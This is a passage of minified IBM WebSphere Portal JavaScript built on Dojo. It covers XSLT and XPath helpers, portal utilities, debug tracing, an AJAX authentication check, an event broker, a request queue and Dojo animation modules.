a=e.ownerDocument?e.ownerDocument:document,s=com.ibm.portal.xslt.gecko._transformToFragment(t,o,r,n,a);e.innerHTML="",e.appendChild(s)}ibm.portal.debug.exit("transformAndUpdate")},com.ibm.portal.xslt.ie.XSLT_PROG_IDS=["Msxml2.XSLTemplate.6.0","Msxml2.XSLTemplate.4.0","MSXML2.XSLTemplate.3.0","MSXML2.XSLTemplate"],com.ibm.portal.xslt.ie.DOM_PROG_IDS=["MSXML2.FreeThreadedDOMDocument.6.0","Msxml2.DOMDocument.6.0","Msxml2.DOMDocument.4.0","MSXML2.DOMDocument","MSXML.DOMDocument","Microsoft.XMLDOM"],com.ibm.portal.xslt.ie.FTDOM_PROG_IDS=["Msxml2.FreeThreadedDOMDocument.6.0","Msxml2.FreeThreadedDOMDocument.4.0","MSXML2.FreeThreadedDOMDocument","MSXML.FreeThreadedDOMDocument","Microsoft.FreeThreadedXMLDOM"],com.ibm.portal.xslt.ie._getMSXMLImpl=function(e){for(;e.length>0;){try{var t=new ActiveXObject(e[0]);if(t)return t}catch(e){}e.splice(0,1)}throw new Error("No MSXML implementation exists")},com.ibm.portal.xslt.ie.loadXml=function(e){var t=this._getMSXMLImpl(this.DOM_PROG_IDS);if(t.async=0,t.resolveExternals=0,!t.load(e))throw new Error("Error loading xml file "+e);return t},com.ibm.portal.xslt.ie.loadXmlString=function(e){var t=this._getMSXMLImpl(this.DOM_PROG_IDS);if(t.async=0,t.resolveExternals=0,e&&!t.loadXML(e))throw new Error("Error loading xml string "+e);return t},com.ibm.portal.xslt.ie.loadXsl=function(e){var t=this._getMSXMLImpl(this.FTDOM_PROG_IDS);if(t.async=0,t.resolveExternals=0,t.setProperty("ForcedResync",!1),!t.load(e))throw new Error("Error loading xsl file "+e);return t},com.ibm.portal.xslt.ie.transform=function(e,t,o,r,n){var i=e,a=t;try{a.documentElement||(a=this.loadXsl(t))}catch(e){var s=e.message;throw new Error(""+s,""+s)}var l=this._getMSXMLImpl(this.XSLT_PROG_IDS);l.stylesheet=a;var d=l.createProcessor();if(d.input=i,r)for(var c in r)d.addParameter(c,r[c]);if(o&&d.addParameter("mode",o),n){if(!d.transform())throw new Error("Error transforming xml doc "+i);return d.output}var u=this._getMSXMLImpl(this.DOM_PROG_IDS);return u.async=!1,u.validateOnParse=!1,i.transformNodeToObject(a,u),u},com.ibm.portal.xslt.gecko.loadXml=function(e){var t=null;if(dojo.isSafari){var o=new XMLHttpRequest;o.open("GET",e,!1),o.send(null),200==o.status&&(t=o.responseXML)}else(t=document.implementation.createDocument("","",null)).async=0,t.load(e);return t},com.ibm.portal.xslt.gecko.loadXmlString=function(e){var t=new DOMParser,o=null;if(!e)return document.implementation.createDocument("","",null);try{o=t.parseFromString(e,"text/xml")}catch(t){throw new Error("Error loading xml string "+e)}return o},com.ibm.portal.xslt.gecko.loadXsl=function(e){var t=null;if(dojo.isWebKit){var o=new XMLHttpRequest;o.open("GET",e,!1),o.send(null),200==o.status&&(t=o.responseXML)}else(t=document.implementation.createDocument("","",null)).async=0,t.load(e);return t},com.ibm.portal.xslt.gecko._getXSLTProc=function(e,t,o,r){var n=t;n.documentElement||(n=this.loadXsl(t));var i=new XSLTProcessor;if(i.importStylesheet(n),r)for(var a in r)i.setParameter(null,a,r[a]);return o&&i.setParameter(null,"mode",o),i},com.ibm.portal.xslt.gecko._transformToFragment=function(e,t,o,r,n){var i,a=com.ibm.portal.xslt.gecko._getXSLTProc(e,t,o,r);return i=a.transformToFragment(e,n),a.clearParameters(),i},com.ibm.portal.xslt.gecko.transform=function(e,t,o,r,n){try{var i=null;if(!n)return i=com.ibm.portal.xslt.gecko._getXSLTProc(e,t,o,r).transformToDocument(e);i=com.ibm.portal.xslt.gecko._transformToFragment(e,t,o,r,document);var a=new XMLSerializer,s=dojo.string.trim(a.serializeToString(i));if(dojo.isOpera&&i.firstChild&&"result"==i.firstChild.nodeName){var l=s.indexOf("<result>")+8,d=s.lastIndexOf("</result>");s=dojo.string.trim(s.substring(l,d))}return s}catch(e){throw new Error("Error transforming xml doc "+e)}},com.ibm.portal.xslt.setLayerContentByXml=function(e,t,o,r,n){var i=com.ibm.portal.xslt.transform(t,o,null,r,n);e.innerHTML?e.innerHTML=i:document.getElementById(e).innerHTML=i}),dojo._hasResource["com.ibm.portal.xpath"]||(dojo._hasResource["com.ibm.portal.xpath"]=!0,dojo.provide("com.ibm.portal.xpath"),com.ibm.portal.xpath.evaluateXPath=function(e,t,o){return"undefined"!=typeof ActiveXObject?com.ibm.portal.xpath.ie.evaluateXPath(e,t,o):com.ibm.portal.xpath.gecko.evaluateXPath(e,t,o)},dojo.provide("com.ibm.portal.xpath.ie"),com.ibm.portal.xpath.ie.evaluateXPath=function(e,t,o){if(o){var r="";for(var n in o)r+="xmlns:"+n+"='"+o[n]+"' ";t.ownerDocument?t.ownerDocument.setProperty("SelectionNamespaces",r):t.setProperty("SelectionNamespaces",r)}for(var i,a=t.selectNodes(e),s=[],l=0,d=0;d<a.length;d++)(i=a[d])&&(s[l]=i,l++);return s},dojo.provide("com.ibm.portal.xpath.gecko"),com.ibm.portal.xpath.gecko.evaluateXPath=function(e,t,o){var r,n;try{var i=t;i.evaluate||(i=t.ownerDocument),r=i.evaluate(e,t,(function(e){return o[e]||null}),XPathResult.ANY_TYPE,null)}catch(e){throw new Error("Error with xpath expression"+e)}var a=[],s=0;do{(n=r.iterateNext())&&(a[s]=n,s++)}while(n);return a}),dojo._hasResource["ibm.portal.xml.xslt"]||(dojo._hasResource["ibm.portal.xml.xslt"]=!0,dojo.provide("ibm.portal.xml.xslt"),dojo.require("com.ibm.portal.xslt"),ibm.portal.xml.xslt.ie={},ibm.portal.xml.xslt.gecko={},ibm.portal.xml.xslt.getXmlHttpRequest=function(){return com.ibm.portal.xslt.getXmlHttpRequest()},ibm.portal.xml.xslt.loadXml=function(e){return com.ibm.portal.xslt.loadXml(e)},ibm.portal.xml.xslt.loadXmlString=function(e){return com.ibm.portal.xslt.loadXmlString(e)},ibm.portal.xml.xslt.loadXsl=function(e){return com.ibm.portal.xslt.loadXsl(e)},ibm.portal.xml.xslt.transform=function(e,t,o,r,n){return ibm.portal.debug.entry("transform",[e,t,o,r,n]),com.ibm.portal.xslt.transform(e,t,o,r,n)},ibm.portal.xml.xslt.transformAndUpdate=function(e,t,o,r,n){ibm.portal.debug.entry("transformAndUpdate",[e,t,o,r,n]),com.ibm.portal.xslt.transformAndUpdate(e,t,o,r,n),ibm.portal.debug.exit("transformAndUpdate")},ibm.portal.xml.xslt.ie.loadXml=function(e){return com.ibm.portal.xslt.ie.loadXml(e)},ibm.portal.xml.xslt.ie.loadXmlString=function(e){return com.ibm.portal.xslt.ie.loadXmlString(e)},ibm.portal.xml.xslt.ie.loadXsl=function(e){return com.ibm.portal.xslt.ie.loadXsl(e)},ibm.portal.xml.xslt.ie.transform=function(e,t,o,r,n){return com.ibm.portal.xslt.ie.transform(e,t,o,r,n)},ibm.portal.xml.xslt.gecko.loadXml=function(e){return com.ibm.portal.xslt.gecko.loadXml(e)},ibm.portal.xml.xslt.gecko.loadXmlString=function(e){return com.ibm.portal.xslt.gecko.loadXmlString(e)},ibm.portal.xml.xslt.gecko.loadXsl=function(e){return com.ibm.portal.xslt.gecko.loadXsl(e)},ibm.portal.xml.xslt.gecko.transform=function(e,t,o,r,n){return com.ibm.portal.xslt.gecko.transform(e,t,o,r,n)},ibm.portal.xml.xslt.setLayerContentByXml=function(e,t,o,r,n){com.ibm.portal.xslt.setLayerContentByXml(e,t,o,r,n)}),dojo._hasResource["ibm.portal.xml.xpath"]||(dojo._hasResource["ibm.portal.xml.xpath"]=!0,dojo.provide("ibm.portal.xml.xpath"),dojo.require("com.ibm.portal.xpath"),ibm.portal.xml.xpath.evaluateXPath=function(e,t,o){return com.ibm.portal.xpath.evaluateXPath(e,t,o)},dojo.provide("ibm.portal.xml.xpath.ie"),ibm.portal.xml.xpath.ie.evaluateXPath=function(e,t,o){return com.ibm.portal.xpath.ie.evaluateXPath(e,t,o)},dojo.provide("ibm.portal.xml.xpath.gecko"),ibm.portal.xml.xpath.gecko.evaluateXPath=function(e,t,o){return com.ibm.portal.xpath.gecko.evaluateXPath(e,t,o)}),dojo._hasResource["com.ibm.portal.utilities"]||(dojo._hasResource["com.ibm.portal.utilities"]=!0,dojo.provide("com.ibm.portal.utilities"),com.ibm.portal.utilities={findPortletIdByElement:function(e){ibm.portal.debug.entry("findPortletID",[e]);for(var t="",o=e.parentNode;o&&0==t.length;){if(ibm.portal.debug.text("examining element "+o.tagName+"; class="+o.className,"findPortletID"),"string"==typeof o.className&&o.className&&(o.className.match(/\bwpsPortletBody\b/)||o.className.match(/\bwpsPortletBodyInlineMode\b/))){var r=(t=o.id).indexOf("_mode");r>=0&&(t=t.substring(0,r))}o=o.parentNode}return t.indexOf("portletActions_")>=0&&(t=t.substring(15)),ibm.portal.debug.exit("findPortletID",[t]),t},findFormByElement:function(e){for(var t=e;t&&(!t.tagName||"form"!=t.tagName.toLowerCase());)t=t.parentNode;return t},encodeURI:function(e){ibm.portal.debug.entry("encodeURI",[e]);for(var t=e,o=e.lastIndexOf(":");o>=0;){var r=t.substring(0,o),n=t.substring(o+1);t=r+":"+encodeURIComponent(n),o=r.lastIndexOf(":")}return t=encodeURIComponent(t),ibm.portal.debug.exit("encodeURI",[t]),t},decodeURI:function(e){ibm.portal.debug.entry("decodeURI",[e]);for(var t=decodeURIComponent(e),o=t.indexOf(":");o>=0;){var r=t.substring(0,o),n=t.substring(o+1);o=(t=r+":"+decodeURIComponent(n)).indexOf(":",o+1)}return ibm.portal.debug.exit("decodeURI",[t]),t},getSelectionNodeId:function(e){ibm.portal.debug.entry("getSelectionNodeId",[e]);var t=e.split("@oid:");return ibm.portal.debug.exit("getSelectionNodeId",[t[1]]),t[1]},getControlId:function(e){ibm.portal.debug.entry("_getControlId",[e]);var t=e.split("@oid:")[0].split("oid:");return ibm.portal.debug.exit("getControlId",[t[1]]),t[1]},getOverwriteMap:function(e,t){var o=null,r=com.ibm.portal.utilities.domData.getManager(e);return r?!(o=r.data(e,"_overwritten_"))&&t&&(o={},r.data(e,"_overwritten_",o)):!(o=e._overwritten_)&&t&&(e._overwritten_=o={}),o},overwriteProperty:function(e,t,o,r){ibm.portal.debug.entry("overwriteProperty",[e,t,o,r]);var n=com.ibm.portal.utilities.getOverwriteMap(e,!0);if(r||(r=!1),!(r&&null!=n[t])){null==n[t]?n[t]=e[t]:n[t]=null;var i=com.ibm.portal.utilities.domData.getManager(e);i&&i.trackProperty(e,t),e[t]=o,ibm.portal.debug.text("Property overwrite successful!")}ibm.portal.debug.exit("overwriteProperty")},restoreProperty:function(e,t){ibm.portal.debug.entry("utilities.restoreProperty",[e,t]);var o=e[t],r=com.ibm.portal.utilities.getOverwriteMap(e);return null!=r?(ibm.portal.debug.text("overwritten property value: "+r),e[t]=r[t],r[t]=null):e[t]=null,ibm.portal.debug.exit("utilities.restoreProperty",o),o},getOverwrittenProperty:function(e,t){var o=com.ibm.portal.utilities.getOverwriteMap(e);return o?o[t]:null},setOverwrittenProperty:function(e,t,o){ibm.portal.debug.entry("utilities.setOverwrittenProperty",[e,t,o]),com.ibm.portal.utilities.getOverwriteMap(e,!0)[t]=o,ibm.portal.debug.exit("utilities.setOverwrittenProperty")},callOverwrittenFunction:function(e,t,o){ibm.portal.debug.entry("utilities.callOverwrittenFunction",[e,t,o]);var r=null,n=this.getOverwrittenProperty(e,t);return ibm.portal.debug.text("Overwritten property: "+n),n&&(ibm.portal.debug.text("old property's apply function: "+n.apply),r=o?n.apply(e,o):n.apply(e)),ibm.portal.debug.exit("utilities.callOverwrittenFunction",r),r},clearOverwrittenProperties:function(e){ibm.portal.debug.entry("utilities.clearOverwrittenProperties",[e]),e&&(com.ibm.portal.utilities.domData(e,"_overwritten_",null),e._overwritten_&&delete e._overwritten_),ibm.portal.debug.exit("utilities.clearOverwrittenProperties")},isExternalUrl:function(e){ibm.portal.debug.entry("isExternalUrl",[e]);var t=window.location.host,o=window.location.protocol,r=e.split("?")[0],n=!(r.indexOf("://")<0||0==r.indexOf(o)&&r.indexOf(t)==o.length+2);return ibm.portal.debug.text('urlStringNoQuery.indexOf("://") = '+r.indexOf("://")),ibm.portal.debug.text("urlStringNoQuery.indexOf(protocol) = "+r.indexOf(o)),ibm.portal.debug.exit("isExternalUrl",n),n},isJavascriptUrl:function(e){ibm.portal.debug.entry("isJavascriptUrl",[e]);var t=0==com.ibm.portal.utilities.string.trim(e.toLowerCase()).indexOf("javascript:");return ibm.portal.debug.exit("isJavascriptUrl",t),t},isPortalUrl:function(e){ibm.portal.debug.entry("utilities.isPortalUrl",[e]);var t=e.indexOf(ibmPortalConfig.portalURI)>=0;return ibm.portal.debug.exit("utilities.isPortalUrl",t),t},addExternalNode:function(e,t){var o=!1;try{o=e.importNode}catch(e){}var r=null;r=0!=o?e.importNode(t,!0):t;try{e.appendChild(r)}catch(e){}},decodeXML:function(e){ibm.portal.debug.entry("decodeXML",[e]);var t=e.replace(/&amp;/g,"&"),o=t.replace(/&amp;/g,"&");return t=o.replace(/&#039;/g,"'"),o=(o=(o=t.replace(/&#034;/g,'"')).replace(/&lt;/g,"<")).replace(/&gt;/g,">"),ibm.portal.debug.exit("decodeXML",[o]),o},eventHandlerToString:function(e){var t=e.toString(),o=t.indexOf("{"),r=t.lastIndexOf("}");return onclickStr=t.substring(o+1,r),onclickStr},_waitingForScript:!1,_isWaitingForScript:function(){return com.ibm.portal.utilities._waitingForScript},stopWaitingForScript:function(){com.ibm.portal.utilities._waitingForScript=!1},waitFor:function(e,t,o,r){var n=setInterval((function(){e()&&(clearInterval(n),r?o(r):o())}),t)},waitForScript:function(e,t){com.ibm.portal.utilities._waitingForScript=!0,com.ibm.portal.utilities.waitFor((function(){return!com.ibm.portal.utilities._isWaitingForScript()}),500,e,t)}},function(){var e=0,t=0,o=[],r={};com.ibm.portal.utilities.DomDataManager=function(e){this.trackAll=e,this.dataSet={},this.tracked={},this.trackedProps={},this.trackedConnections={},this.id="DomDataManager"+t++,o.push(this),r[this.id]=this};var n=["onclick","click","submit","onsubmit"];dojo.extend(com.ibm.portal.utilities.DomDataManager,{getDuid:function(t,o){var r;return 1==t.nodeType?(r=t.getAttribute("duid"))||(r="duid"+e++,t.setAttribute("duid",r)):(r=t.duid)||(r=t.duid="duid"+e++),e==Number.MAX_VALUE&&(e=0),r},data:function(e,t,o){var r,n;if(e)return arguments.length>2?(n=this.getDuid(e,!0),this.trackAll&&this.track(e),(r=this.dataSet[n])||(r=this.dataSet[n]={}),r[t]=o,e._domMgrId=this.id,o):(n=this.getDuid(e))&&(r=this.dataSet[n])?r[t]:null},track:function(e){if(e&&1==e.nodeType){var t=this.getDuid(e,!0);return this.tracked[t]=e,t}return null},trackProperty:function(e,t){var o=this.track(e);o&&(this.trackedProps[o]||(this.trackedProps[o]={}),this.trackedProps[o][t]=!0)},trackConnection:function(e,t){var o=this.track(e);o&&!this.trackedConnections[o]&&(this.trackedConnections[o]=[]),this.trackedConnections[o].push(t)},toString:function(){return this.id},_nodeExists:function(e){for(;e;){if(e.parentNode==dojo.body())return!0;e=e.parentNode}return!1},cleanNode:function(e){if(e&&this.tracked){var t=this.track(e);if(t){for(var o in this.trackedProps[t])this.tracked[t][o]=null;for(var r=0;r<n.length;r++)try{this.tracked[t][n[r]]=null}catch(e){}if(this.trackedConnections[t])for(;this.trackedConnections[t].length>0;)dojo.disconnect(this.trackedConnections[t].pop());delete this.trackedConnections[t],delete this.trackedProps[t],delete this.dataSet[t],delete this.tracked[t]}}},clean:function(e){for(var t in this.tracked)!e&&this._nodeExists(this.tracked[t])||this.cleanNode(this.tracked[t])},destroy:function(){this.clean(!0),delete this.dataSet,delete this.tracked,delete this.trackedProps,delete this.trackedConnections;for(var e=0;e<o.length;e++)if(o[e]==this){o.splice(e,1);break}for(var t in s)s[t]==this&&delete s[t];delete r[this.id]}});var i=new com.ibm.portal.utilities.DomDataManager(!0),a=i,s={};dojo.addOnWindowUnload((function(){for(;o.length>0;)o.pop().destroy()})),com.ibm.portal.utilities.domData=function(){var e=com.ibm.portal.utilities.domData.getManager(arguments[0]);if(e)return e.data.apply(e,arguments)},dojo.mixin(com.ibm.portal.utilities.domData,{setCurrent:function(e){null!=e&&(a=e)},resetCurrent:function(){a=i},getCurrent:function(){return a},getManager:function(e){return e==document||e==dojo.body()?i:e==window||"string"!=typeof e.nodeName||"number"!=typeof e.nodeType?null:e._domMgrId&&r[e._domMgrId]||a},register:function(e,t){s[t]=e},get:function(e){return s[e]}}),dojo.subscribe("/portal/DOM/StartUpdate",(function(e){var t=com.ibm.portal.utilities.domData.get(e);t&&com.ibm.portal.utilities.domData.setCurrent(t)})),dojo.subscribe("/portal/DOM/StopUpdate",(function(e){com.ibm.portal.utilities.domData.get(e)==com.ibm.portal.utilities.domData.getCurrent()&&com.ibm.portal.utilities.domData.resetCurrent()}))}(),com.ibm.portal.utilities.string={findNext:function(e,t,o){ibm.portal.debug.entry("string.findNext",[e,t]);for(var r=-1,n=0;n<t.length;n++){var i=null;o&&(i=o+t[n].length);var a=e.indexOf(t[n],i);a>-1&&(a<r||-1==r)&&(r=a)}return ibm.portal.debug.exit("string.findNext",[r]),r},contains:function(e,t){ibm.portal.debug.entry("string.contains",[e,t]);var o=!1;return null!=e&&null!=t&&(o=-1!=e.indexOf(t)),ibm.portal.debug.exit("string.contains",[o]),o},strip:function(e,t){ibm.portal.debug.entry("string.strip",[e,t]);var o=e.replace(new RegExp(t,"g"),"");return ibm.portal.debug.exit("string.strip",[o]),o},properCase:function(e){if(null==e||e.length<1)return"";ibm.portal.debug.entry("string.properCase",[e]);var t=e.charAt(0).toUpperCase();return e.length>1&&(t+=e.substring(1).toLowerCase()),ibm.portal.debug.exit("string.properCase",[t]),t},trim:function(e){ibm.portal.debug.entry("string.trim",[e]);var t=e;return t=(t=t.replace(/^\s+/,"")).replace(/\s+$/,""),ibm.portal.debug.exit("string.trim",t),t}},dojo.declare("com.ibm.portal.utilities.HttpUrl",null,{constructor:function(e){this.scheme=window.location.protocol+"//",this.server=this._extractServer(e),this.port=this._extractPort(e),this.path=this._extractPath(e),this.query=this._extractQuery(e),this.anchor=""},addParameter:function(e,t){this.query+="&"+e+"="+t},toString:function(){var e="";return""!=this.server&&(e+=this.scheme+this.server),""!=this.port&&(e+=":"+this.port),e+="/"+this.path,""!=this.query&&(e+="?"+this.query),""!=this.anchor&&(e+="#"+this.anchor),e},_extractServer:function(e){var t=e.indexOf(this.scheme),o="";if(0==t){var r=e.indexOf("/",t+this.scheme.length);o=e.substring(t+this.scheme.length,r).split(":")[0]}return o},_extractPort:function(e){var t=e.indexOf(this.server),o="";if(t>=0){var r=e.indexOf("/",t),n=e.substring(t,r).split(":");n.length>1&&(o=n[1])}return o},_extractPath:function(e){var t=e.indexOf(this.server),o="";if(t>=0){var r=e.indexOf("/",t),n=e.indexOf("?"),i=e.lastIndexOf("#");o=n>=0?e.substring(r+1,n):i>=0?e.substring(r+1,i):e.substring(r+1)}return o},_extractQuery:function(e){var t="",o=e.split("?");return o.length>1&&(t=o[1].split("#")[0]),t},_extractAnchor:function(e){var t="",o=e.split("#");return o.length>1&&(t=o[o.length-1]),t}})),dojo._hasResource["com.ibm.portal.debug"]||(dojo._hasResource["com.ibm.portal.debug"]=!0,dojo.provide("com.ibm.portal.debug"),dojo.provide("ibm.portal.debug"),ibm.portal.debug.setTrace=function(e){ibm.portal.debug._traceString=e},ibm.portal.debug._isDebugEnabled=function(){var e=!1;return"undefined"!=typeof ibmPortalConfig&&ibmPortalConfig&&ibmPortalConfig.isDebug&&(e=!0),e},ibm.portal.debug.text=function(e,t){if("undefined"!=typeof ibmPortalConfig&&ibmPortalConfig&&ibmPortalConfig.isDebug){var o=ibm.portal.debug._traceString;o?t&&t.indexOf(o)>=0&&window.console.log(e):window.console.log(e)}},ibm.portal.debug.entry=function(e,t){if(ibm.portal.debug._isDebugEnabled()){var o=e+" --\x3e entry; { ";if(t&&t.length>0)for(arg in t)o=o+t[arg]+" ";o+=" } ",ibm.portal.debug.text(o,e)}},ibm.portal.debug.exit=function(e,t){if(ibm.portal.debug._isDebugEnabled()){var o=e+" --\x3e exit;";void 0!==t&&(o=o+" { "+t+" } "),ibm.portal.debug.text(o,e)}},ibm.portal.debug.escapeXmlForHTMLDisplay=function(e){return e=(e=e.replace(/</g,"&lt;")).replace(/>/g,"&gt;")}),dojo._hasResource["com.ibm.ajax.auth"]||(dojo._hasResource["com.ibm.ajax.auth"]=!0,dojo.provide("com.ibm.ajax.auth"),com.ibm.ajax.auth={prepareSecure:function(e,t,o){return e._handle=e.handle,e.handle=dojo.partial(this.testAuthenticationHandler,this,t,o),e},setAuthenticationHandler:function(e){this.authenticationHandler=e},setTestAuthenticationHandler:function(e){this.testAuthenticationHandler=e},setDefaultAuthenticationTests:function(e,t,o){this.checkFromCaller=e,this.checkByContentType=t,this.checkByStatusCode=o},addAuthenticationCheck:function(e){e&&this.authenticationChecks.push(e)},isAuthenticationRequired:function(e,t){var o=t.args.handleAs;if(!e||-1==dojo.indexOf(["cancel","timeout"],e.dojoType)){if(this.checkByContentType&&-1!=dojo.indexOf(["xml","json","json-comment-optional","text"],o)&&t.xhr&&/^text\/html/.exec(t.xhr.getResponseHeader("Content-Type"))&&t.xhr.status>=200&&t.xhr.status<300)return ibm.portal.debug.text("auth::isAuthenticationRequired DEBUG content type does not match request, assume logged out"),!0;if(this.checkByStatusCode&&-1!=dojo.indexOf(["xml","json","json-comment-optional","text"],o)&&t.xhr&&302==t.xhr.status)return ibm.portal.debug.text("auth::isAuthenticationRequired DEBUG redirect received, assume login request"),!0;if(this.checkByStatusCode&&t.xhr&&(401==t.xhr.status||0==t.xhr.status)&&t.xhr.getResponseHeader("WWW-Authenticate")&&-1!=t.xhr.getResponseHeader("WWW-Authenticate").indexOf("IBMXHR"))return ibm.portal.debug.text("auth::isAuthenticationRequired DEBUG Portal 401 received, assume login required"),!0}for(var r=0;r<this.authenticationChecks.length;r++)if(this.authenticationChecks[r](this,e,t))return!0;return!1},testAuthenticationHandler:function(e,t,o,r,n){var i=dojo._toArray(arguments).slice(3),a=!1;if(r&&-1!=dojo.indexOf(["cancel","timeout"],r.dojoType)||(a=!(!e.checkFromCaller||"function"!=typeof t||!t(r,n))||e.isAuthenticationRequired(r,n,t)),a){var s=e._parseUri(n.args.url).path;dojo.cookie("WASPostParam",null,{expires:-1,path:s}),dojo.cookie("WASReqURL",null,{expires:-1,path:"/"}),e.authenticationHandler(r,n,o),i[0]=new Error("xhr unauthenticated"),i[0].dojoType="unauthenticated"}return n.args._handle?n.args._handle.apply(this,i):r},_parseUri:function(e){if(!e)return null;e=new dojo._Url(e);var t=this._splitQuery(e.query);return e.queryParameters=t,e},_splitQuery:function(e){var t={};if(!e)return t;"?"==e.charAt(0)&&(e=e.substring(1));for(var o=e.split("&"),r=0;r<o.length;r++)if(o[r].length>0){var n=o[r].indexOf("=");if(-1==n){var i=t[a=decodeURIComponent(o[r])];dojo.isArray(i)?i.push(""):t[a]=i?[i,""]:""}else if(n>0){var a=decodeURIComponent(o[r].substring(0,n)),s=decodeURIComponent(o[r].substring(n+1));i=t[a];dojo.isArray(i)?i.push(s):t[a]=i?[i,s]:s}}return t},checkFromCaller:!0,checkByContentType:!0,checkByStatusCode:!0,authenticationChecks:[],authenticationHandler:function(){ibm.portal.debug.text("auth::authenticationHandler DEBUG authentication was required")}}),dojo._hasResource["com.ibm.portal.EventBroker"]||(dojo._hasResource["com.ibm.portal.EventBroker"]=!0,dojo.provide("com.ibm.portal.EventBroker"),dojo.require("com.ibm.portal.debug"),dojo.declare("com.ibm.portal.Event",null,{constructor:function(e){this.eventName=e,this._listeners=new Array},fire:function(e){ibm.portal.debug.text("Firing event: "+this.eventName+" with parameters: "),dojo.publish(this.eventName,[e])},register:function(e,t){return t?dojo.subscribe(this.eventName,e,t):dojo.subscribe(this.eventName,null,e)},unregister:function(e){dojo.unsubscribe(e)},cancel:function(e){dojo.publish(this.id+"/cancel")}}),dojo.declare("com.ibm.portal.EventBroker",null,{startPage:new com.ibm.portal.Event("portal/StartPage"),endPage:new com.ibm.portal.Event("portal/EndPage"),startFragment:new com.ibm.portal.Event("portal/StartFragment"),endFragment:new com.ibm.portal.Event("portal/EndFragment"),fragmentUpdated:new com.ibm.portal.Event("portal/FragmentUpdated"),startRequest:new com.ibm.portal.Event("portal/StartRequest"),endRequest:new com.ibm.portal.Event("portal/EndRequest"),cancelAll:new com.ibm.portal.Event("portal/CancelAll"),cancelFragmentUpdate:new com.ibm.portal.Event("portal/CancelFragmentUpdate"),stateChanged:new com.ibm.portal.Event("portal/StateChanged"),startScriptHandling:new com.ibm.portal.Event("portal/StartScriptHandling"),endScriptHandling:new com.ibm.portal.Event("portal/EndScriptHandling"),startScriptExecution:new com.ibm.portal.Event("portal/StartScriptExecution"),endScriptExecution:new com.ibm.portal.Event("portal/EndScriptExecution"),javascriptCleanup:new com.ibm.portal.Event("portal/JavascriptCleanup"),beforeSnapShot:new com.ibm.portal.Event("portal/BeforeSnapShot"),afterSnapShot:new com.ibm.portal.Event("portal/AfterSnapShot"),restorePointUpdated:new com.ibm.portal.Event("portal/RestorePointUpdated"),clearRestorePoint:new com.ibm.portal.Event("portal/ClearRestorePoint"),stopEvent:new com.ibm.portal.Event("portal/StopEvent"),redirect:new com.ibm.portal.Event("portal/Redirect")}),com.ibm.portal.EVENT_BROKER=new com.ibm.portal.EventBroker),dojo._hasResource["com.ibm.portal.services.PortalRestServiceRequestQueue"]||(dojo._hasResource["com.ibm.portal.services.PortalRestServiceRequestQueue"]=!0,dojo.provide("com.ibm.portal.services.PortalRestServiceRequestQueue"),dojo.declare("com.ibm.portal.services.PortalRestServiceRequestQueue",null,{maxNumberOfActiveRequests:4,constructor:function(){var e="PortalRestServiceRequestQueue.constructor";ibm.portal.debug.entry(e),this._activeRequests=0,this._requestQueue=[],ibm.portal.debug.exit(e)},add:function(e){var t="PortalRestServiceRequestQueue.add";ibm.portal.debug.entry(t,[e]),this._requestQueue.push(e);var o=this;setTimeout((function(){o._executeNextRequest()}),5),ibm.portal.debug.exit(t)},_executeNextRequest:function(){var e="PortalRestServiceRequestQueue._executeNextRequest";if(ibm.portal.debug.entry(e),ibm.portal.debug.text(this._requestQueue.length+" request(s) in the queue. "+this._activeRequests+" active request(s) currently.",e),this._requestQueue.length>0&&this._activeRequests<this.maxNumberOfActiveRequests){var t=this._requestQueue.shift();ibm.portal.debug.text("Executing request: "+t,e);var o=this;setTimeout((function(){o._activeRequests=o._activeRequests+1,t.execute((function(){o._notifyComplete()}))}),1)}else ibm.portal.debug.text("No request(s) pending or maximum number of requests already currently active.",e);ibm.portal.debug.exit(e)},_notifyComplete:function(){this._activeRequests=this._activeRequests-1,this._activeRequests<0&&(this._activeRequests=0);var e=this;setTimeout((function(){e._executeNextRequest()}),5)}})),dojo._hasResource["dojo.dnd.common"]||(dojo._hasResource["dojo.dnd.common"]=!0,dojo.provide("dojo.dnd.common"),dojo.dnd.getCopyKeyState=dojo.isCopyKeyPressed,dojo.dnd._uniqueId=0,dojo.dnd.getUniqueId=function(){var e;do{e=dojo._scopeName+"Unique"+ ++dojo.dnd._uniqueId}while(dojo.byId(e));return e},dojo.dnd._empty={},dojo.dnd.isFormElement=function(e){var t=e.target;return 3==t.nodeType&&(t=t.parentNode)," button textarea input select option ".indexOf(" "+t.tagName.toLowerCase()+" ")>=0}),dojo._hasResource["dojo.fx.Toggler"]||(dojo._hasResource["dojo.fx.Toggler"]=!0,dojo.provide("dojo.fx.Toggler"),dojo.declare("dojo.fx.Toggler",null,{node:null,showFunc:dojo.fadeIn,hideFunc:dojo.fadeOut,showDuration:200,hideDuration:200,constructor:function(e){var t=this;dojo.mixin(t,e),t.node=e.node,t._showArgs=dojo.mixin({},e),t._showArgs.node=t.node,t._showArgs.duration=t.showDuration,t.showAnim=t.showFunc(t._showArgs),t._hideArgs=dojo.mixin({},e),t._hideArgs.node=t.node,t._hideArgs.duration=t.hideDuration,t.hideAnim=t.hideFunc(t._hideArgs),dojo.connect(t.showAnim,"beforeBegin",dojo.hitch(t.hideAnim,"stop",!0)),dojo.connect(t.hideAnim,"beforeBegin",dojo.hitch(t.showAnim,"stop",!0))},show:function(e){return this.showAnim.play(e||0)},hide:function(e){return this.hideAnim.play(e||0)}})),dojo._hasResource["dojo.fx"]||(dojo._hasResource["dojo.fx"]=!0,dojo.provide("dojo.fx"),function(){var e=dojo,t={_fire:function(e,t){return this[e]&&this[e].apply(this,t||[]),this}},o=function(t){this._index=-1,this._animations=t||[],this._current=this._onAnimateCtx=this._onEndCtx=null,this.duration=0,e.forEach(this._animations,(function(e){this.duration+=e.duration,e.delay&&(this.duration+=e.delay)}),this)};e.extend(o,{_onAnimate:function(){this._fire("onAnimate",arguments)},_onEnd:function(){e.disconnect(this._onAnimateCtx),e.disconnect(this._onEndCtx),this._onAnimateCtx=this._onEndCtx=null,this._index+1==this._animations.length?this._fire("onEnd"):(this._current=this._animations[++this._index],this._onAnimateCtx=e.connect(this._current,"onAnimate",this,"_onAnimate"),this._onEndCtx=e.connect(this._current,"onEnd",this,"_onEnd"),this._current.play(0,!0))},play:function(t,o){if(this._current||(this._current=this._animations[this._index=0]),!o&&"playing"==this._current.status())return this;var r=e.connect(this._current,"beforeBegin",this,(function(){this._fire("beforeBegin")})),n=e.connect(this._current,"onBegin",this,(function(e){this._fire("onBegin",arguments)})),i=e.connect(this._current,"onPlay",this,(function(t){this._fire("onPlay",arguments),e.disconnect(r),e.disconnect(n),e.disconnect(i)}));return 